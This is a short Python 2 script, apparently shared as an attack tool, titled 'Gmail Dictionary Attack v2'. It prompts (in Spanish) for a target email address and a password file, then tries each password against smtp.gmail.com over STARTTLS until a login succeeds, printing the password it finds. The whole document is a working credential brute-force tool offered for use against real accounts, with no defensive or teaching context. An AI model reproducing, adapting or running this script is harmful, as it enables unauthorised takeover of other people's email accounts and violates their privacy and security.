# Program: Gmail Dictionary Attack v2
# Author: 0x4171341
# Brute force smtp.gmail.com using a dictionary attack over TLS.

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Agregue el email: ")
passwfile = raw_input("agregue el archivo de password: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password obtenido: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrecto: %s" % password
